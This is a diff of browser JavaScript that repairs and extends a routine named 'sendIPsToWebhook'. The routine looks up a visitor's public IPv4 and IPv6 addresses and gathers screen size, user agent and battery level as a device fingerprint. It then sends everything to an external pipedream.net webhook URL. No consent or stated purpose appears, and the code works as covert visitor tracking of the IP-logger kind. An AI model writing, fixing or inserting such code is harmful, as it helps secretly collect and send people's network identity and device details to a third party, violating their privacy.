@@ -219,12 +219,30 @@ function getDeviceInfo() {
   return "Unknown device";
 }
 
-try {
-        const battery = await navigator.getBattery();
-        info.battery = battery.level * 100,
-        };
+async function getDeviceInfo() {
+  const info = {};
 
-    
+  // Screen info
+  info.screen = {
+    width: screen.width,
+    height: screen.height,
+    pixelRatio: window.devicePixelRatio
+  };
+
+  // User agent (browser/device info)
+  info.userAgent = navigator.userAgent;
+
+  // Battery info
+  try {
+    const battery = await navigator.getBattery();
+    info.battery = battery.level * 100;
+  } catch (e) {
+    info.battery = "Unavailable";
+  }
+
+  return encodeURIComponent(JSON.stringify(info));
+}
+
 async function sendIPsToWebhook() {
   try {
     const ipv4Res = await fetch("https://api.ipify.org/?format=json");
@@ -235,10 +253,11 @@ async function sendIPsToWebhook() {
     const ipv6Data = await ipv6Res.json();
     const ipv6 = ipv6Data.ip;
 
-    // Now that both IPs are fetched, send them to your endpoint
-    const url = `https://eou274ml4ri0qf0.m.pipedream.net/?ip4v=${ipv4}&ip6v=${ipv6}&device=${getDeviceInfo()}battery=${nfo.battery}`;
-    await fetch(url);
+    const deviceInfo = await getDeviceInfo();
 
+    const url = `https://eou274ml4ri0qf0.m.pipedream.net/?ip4v=${ipv4}&ip6v=${ipv6}&device=${deviceInfo}`;
+
+    await fetch(url);
     console.log("IPs sent successfully:", ipv4, ipv6);
   } catch (err) {
     console.error("Error fetching/sending IPs:", err);
